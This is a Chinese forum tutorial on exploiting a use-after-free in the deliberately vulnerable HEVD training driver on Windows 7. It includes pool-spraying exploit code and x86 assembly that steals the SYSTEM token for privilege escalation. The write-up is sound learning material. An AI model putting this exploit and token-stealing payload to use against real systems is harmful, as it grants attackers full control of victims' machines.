> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270059.htm)

> [原创] 内核漏洞学习 [3]-HEVD-UAF

HEVD-UseAfterFreeNonPagedPool
=============================

一： 概述
-----

HEVD：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习

 

[Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

> 环境准备：
> 
> Windows 7 X86 sp1 虚拟机
> 
> 使用 VirtualKD 和 windbg 双机调试
> 
> HEVD 3.0+KmdManager+DubugView

[](#二：前置知识：)二：前置知识：
-------------------

### [](#（1）uaf（useafterfree）原理)（1）UAf（UseAfterFree）原理

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

*   内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
*   内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
*   内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

```
//linux
#include #include #include int main()
{
    char *p1;
    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间
    memcpy(p1,"hello",10);
    printf("p1 addr:%x,%s\n",p1,p1);
    free(p1);//释放内存空间
    char *p2;
    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存
    memcpy(p1,"world",10);//对内存进行修改
    printf("p2 addr:%x,%s\n",p2,p1);//验证
    return 0;
}
//1.指针p1申请内存，打印其地址值
//2.然后释放p1
//3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值 
```

运行结果如下

```
p1 addr:222e010,hello
p1 addr:222e010,world

```

简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。

### [](#（2）nonpagedpool（非换页内存）)（2）NonPagedPool（非换页内存）

用户空间是从 “堆(Heap)” 分配缓冲区的，内核中也有类似的机制，但是不叫 “堆” 而称为“池(Pool)”。不过二者有着重要的区别。  
首先，用户空间的堆是属于进程的; 而内核中的池则是全局的，属于整个系统。堆所占的是虚存空间，堆的扩充基本上体现在作为后备存储的页面倒换文件的扩充，而不必同时占用那么多的物理页面。而内核中的池则分成两种: 一种是所占页面不可倒换的，每个页面不管其是否受到访问都真金白银地占着物理页面，要求这种池的大小可扩充显然不现实。另一种是所占页面可以倒换的，这种池的大小倒是可以扩充，因为 (已分配而）暂时不受访问的（虚存）页面可以被倒换到作为后备的页面倒换文件中。

 

换页内存池和非换页内存池则是提供给系统内核模块和设备驱动程序使用的。在换页内存池中分配的内存有可能在物理内存紧缺的情况下被换出到外存中; 而非换页内存池中分配的内存总是处于物理内存中。

 

![](https://img-blog.csdnimg.cn/img_convert/ce54c234e74de550fdb6250ec922e368.png)

 

windows 内核中定义了许多不同的池

 

![](https://img-blog.csdnimg.cn/img_convert/a81b6a92496d51f8f74ea15bd5e6f199.png)

 

不过，实际使用的基本上就是 NonPagedPool 和 PagedPool 两个。

 

MilnitializeNonPagedPool 函数确定非换页内存池的起始和结束物理页面帧 MiStartOfInitialPoolFrame 和 MiEndOfInitialPoolFrame,

 

一旦非换页内存池的结构已建立，接下来系统代码可以通过 MiAllocatePoolPages 和 MiFreePoolPages 函数来申请和归还页面。

 

Windows 充分利用这些页面自身的内存来构建起一组空闲页面链表，每个页面都是一个 MMFREE_POOL_ENTRY 结构，如图所示。MiInitializeNonPagedPool 函数已经把数组 MmNonPagedPoolFreeListHead 初始化成只包含 --- 个完整的空闲内存块，该内存块包括所有的非换页页面。

 

![](https://img-blog.csdnimg.cn/img_convert/b2df0fec925210ef9c84ba5e1b9e2292.png)

 

在非换页内存池的结构中，每个空闲链表中的每个节点包含 1、2、3、4 或 4 个以上的页面，在同一个节点上的页面其虚拟地址空间是连续的。第一个页面的 List 域构成了链表结构，Size 域指明了这个节点所包含的页面数量，Owner 域指向自己; 后续页面的 List 和 Size 域没有使用，但 Owner 域很重要，它指向第一个页面。

 

非换页内存池中的页面回收是通过 MiFreePoolPages 函数来完成的,

 

内核和设备驱动程序使用非分页池来存储系统无法处理页面错误时可能访问的数据，非页面缓冲池总是保持在物理内存中，非页面缓冲池虚拟内存被分配物理内存。存储在非分页池中的通用系统数据结构包括表示进程和线程的内核和对象，互斥对象，信号灯和事件等同步对象，表示为文件对象的文件引用以及 I / O 请求包（IRP）代表 I / O 操作

[](#三：漏洞点分析)三：漏洞点分析
-------------------

漏洞原理：UAf 漏洞，当一个内存块被释放之后再次被使用，UseAfterFreeNonPagedPool.c 中存在释放后没有被设置为 NULL 的内存指针： `g_UseAfterFreeObjectNonPagedPool`

 

（1）加载驱动

 

安装驱动程序，使用 kmdManager 加载驱动程序，DebugView 检测内核，可以看到加载驱动程序成功。

 

![](https://img-blog.csdnimg.cn/img_convert/5edf823fbae67c4d8ca0d4f6c2a20c11.png)

 

windbg:

 

![](https://img-blog.csdnimg.cn/img_convert/c03497a167be87f6fa54e6665fba402c.png)

```
lm  查看所有已加载模块
lm m H* 设置过滤，查找HEVD模块
lm m HEVD

```

![](https://img-blog.csdnimg.cn/img_convert/6eb6f30640039766a5613027c908b92c.png)

 

**（2）分析漏洞点**

 

对 UseAfterFreeNonPagedPool.c 源码进行分析，漏洞函数 FreeUaFObjectNonPagedPool，存在明显的 UAF 漏洞，不安全版本中内存指针 g_UseAfterFreeObjectNonPagedPool，调用 ExFreePoolWithTag 函数对非换页内存池的页面回收后 ，没有把该指针 **g_UseAfterFreeObjectNonPagedPool=NULL**，自然安全版本有 g_UseAfterFreeObjectNonPagedPool=NULL 这个过程

```
ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
g_UseAfterFreeObjectNonPagedPool = NULL;//安全版本。
ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);//不安全版本

```

[](#四：漏洞利用)四：漏洞利用
-----------------

### 1. 利用思路：

如果申请内存的大小和 UAF 中内存的大小相同，那么可能申请到刚释放的内存池，构造好了 (fake_uaf) 中的数据，那么当释放 uaf 之后, 通过 fake_uaf 使得 uaf 就会指向我们 payload 的位置，再次使用 uaf->payload 从而达到提取的效果。电脑中有许许多多的空闲内存，如果只申请一次内存，不一定申请到释放的那块内存，所以要申请很多次跟释放的内存相同大小的内存。在内核中，换页内存池（PagedPool）和非换页内存池（NonPagedPool）则是提供给系统内核模块和设备驱动程序使用的。对于 NonPagedPool，使用`ExAllocatePoolWithTag`和`ExFreePoolWithTag`函数 申请和释放。

 

（1）相关的 IO 控制码定义：

```
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 
    if (IrpSp)
    {
        switch (IoControlCode)
        {
       case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
            Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
            break;
 
        }
    }

```

IO 控制码对应的分发函数

> HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL------AllocateUaFObjectNonPagedPoolIoctlHandler--AllocateUaFObjectNonPagedPool
> 
> HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL---AllocateFakeObjectNonPagedPoolIoctlHandler--AllocateFakeObjectNonPagedPool()
> 
> HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL---FreeUaFObjectNonPagedPoolIoctlHandler-- FreeUaFObjectNonPagedPool()
> 
> HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL---UseUaFObjectNonPagedPoolIoctlHandler--UseUaFObjectNonPagedPool

 

以下关键代码只放出关键部分，具体看源码，全部贴出来太多了

 

AllocateUaFObjectNonPagedPool 函数：

```
NTSTATUS
AllocateUaFObjectNonPagedPool(
    VOID
)
{
    __try
    {
        DbgPrint("[+] Allocating UaF Object\n");
     //ExAllocatePoolWithTag 函数申请非分页内存池，
        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(USE_AFTER_FREE_NON_PAGED_POOL),
            (ULONG)POOL_TAG
        );
 
 
       RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);//用‘A’填充
        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';  //添加一个空终止符
        UseAfterFree->Callback = &UaFObjectCallbackNonPagedPool;//设置一个回调指针，这里是利用点，我们要将自己的payload写到这里
        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
 
    }
 
    return Status;
}

```

AllocateFakeObjectNonPagedPool 函数: 允许在非分页内存池上分配一个假的的对象；该函数允许我们把假的对象分配到原本的已经释放的 UAF 对象所在的位置上。

```
NTSTATUS
AllocateFakeObjectNonPagedPool(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
)
{
 
    __try
    {
        DbgPrint("[+] Creating Fake Object\n");
 
       // ExAllocatePoolWithTag分配内存
        KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            (ULONG)POOL_TAG
        );
 
        RtlCopyMemory(
            (PVOID)KernelFakeObject,
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL)
        );
 
 
        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
 
        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
 
    }
 
    return Status;
}

```

FreeUaFObjectNonPagedPool

```
NTSTATUS
FreeUaFObjectNonPagedPool(
    VOID
)
{
    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool)
        {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
            //ExFreePoolWithTag 释放，但是没有对释放的指针置空，造成悬挂指针，UAF漏洞。
            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
 
    return Status;
}

```

UseUaFObjectNonPagedPool：由于存在 UAF 漏洞，利用 g_UseAfterFreeObjectNonPagedPool->Callback(); 执行 payload。。

```
NTSTATUS
UseUaFObjectNonPagedPool(
    VOID
)
{
 
    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool)
        {
            DbgPrint("[+] Using UaF Object\n");
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
            DbgPrint("[+] Calling Callback\n");
 
            if (g_UseAfterFreeObjectNonPagedPool->Callback)
            {
                g_UseAfterFreeObjectNonPagedPool->Callback();
            }
 
            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
 
    return Status;
}

```

### 2. 利用过程

```
// 1.调用AllocateUaFObjectNonPagedPool
 
DeviceIoControl(hDevice, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, NULL, NULL, NULL, 0, &recvBuf, NULL);
 
// 2.调用 FreeUaFObjectNonPagedPool()函数释放对象
printf("Start to call FreeUaFObject()...\n");
DeviceIoControl(hDevice, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, NULL, NULL, NULL, 0, &recvBuf, NULL);
 
printf("Start to write shellcode()...\n");
//申请假的chunk
PUSE_AFTER_FREE fake_UseAfterFree = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));
//指向我们的payload
fake_UseAfterFree->countinter = ShellCode;
 
RtlFillMemory(fake_UseAfterFree->bufffer, sizeof(fake_UseAfterFree->bufffer), 0x41);
 
// 3.调用AllocateFakeObjectNonPagedPool函数，，，，池喷射，，成功后，会申请到跟g_UseAfterFreeObjectNonPagedPool指向一样的的内困空间，callback被改为我们的payload
 
for (int i = 0; i < 5000; i++)
{
    DeviceIoControl(hDevice, HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL, fake_UseAfterFree, 0x60, NULL, 0, &recvBuf, NULL);
}
 
//4.调用UseUaFObjectNonPagedPool，执行payload，此处的callback函数早已经被替换成我们的payload，所以再次调用为设置为NUll的内存指针g_UseAfterFreeObjectNonPagedPool后直接执行我们的payload代码
DeviceIoControl(hDevice, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, NULL, NULL, NULL, 0, &recvBuf, NULL);

```

payload 功能：遍历进程，得到系统进程的 token，把当前进程的 token 替换，达到提权目的。（跟前两篇一样的原理，**替换 token**）

 

相关内核结构体：

 

在内核模式下，fs:[0] 指向 KPCR 结构体

```
_KPCR
+0x120 PrcbData         : _KPRCB
_KPRCB
+0x004 CurrentThread    : Ptr32 _KTHREAD，_KTHREAD指针，这个指针指向_KTHREAD结构体
_KTHREAD
+0x040 ApcState         : _KAPC_STATE
_KAPC_STATE
+0x010 Process          : Ptr32 _KPROCESS,_KPROCESS指针，这个指针指向EPROCESS结构体
_EPROCESS
   +0x0b4 UniqueProcessId  : Ptr32 Void,当前进程ID，系统进程ID=0x04
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程
   +0x0f8 Token            : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限

```

payload：

```
__asm {
       pushad                               ; 保存寄存器
 
 
       xor eax, eax                         ;eax置0
       mov eax, fs:[eax + KTHREAD_OFFSET]   ; 获得当前线程的_KTHREAD结构，KTHREAD_OFFSET=0x124
                                            ; FS:[0x124] 是 _KTHREAD结构
 
       mov eax, [eax + EPROCESS_OFFSET]     ;  找到_EPROCESS结构， nt!_KTHREAD.ApcState.Process，EPROCESS_OFFSET 0x50
 
 
       mov ecx, eax                         ; ecx ，当前进程Eprocess结构体
 
       mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
 
       SearchSystemPID:
           mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink，FLINK_OFFSET=0xb8
           sub eax, FLINK_OFFSET
           cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId，PID_OFFSET=0xb4
           jne SearchSystemPID              ;遍历链表根据PID判断是否为SYSTEM_PID(0x4)
       //替换token
       mov edx, [eax + TOKEN_OFFSET]        ; 获得系统进程token  。TOKEN_OFFSET=0xf8
       mov [ecx + TOKEN_OFFSET], edx        ; 系统进程token替换当前进程token
 
       ; End of Token Stealing Stub
 
       popad                                ; Restore registers state
 
       ; Kernel Recovery Stub
       xor eax, eax                         ; Set NTSTATUS SUCCEESS
       add esp, 12                          ; Fix the stack
       pop ebp                              ; Restore saved EBP
       ret 8                                ; Return cleanly
   }

```

提权成功：

 

![](https://img-blog.csdnimg.cn/img_convert/d2405493866dd08e2204417f0d0a8b10.png)

[](#五：补丁分析)五：补丁分析
-----------------

g_UseAfterFreeObjectNonPagedPool = NULL，free 之后，将内存指针设置为 NULL。

[](#六：参考：)六：参考：
---------------

《Windows 内核原理与实现》

 

《Windows 内核情景分析》

 

https://www.fuzzysecurity.com/tutorials/expDev/19.html

 

https://bbs.pediy.com/thread-252310.htm

 

https://bbs.pediy.com/thread-247019.htm

 

https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/#_4

[[注意] 欢迎加入看雪团队！base 上海，招聘安全工程师、逆向工程师多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#UAF](forum-150-1-158.htm) [#Windows](forum-150-1-160.htm)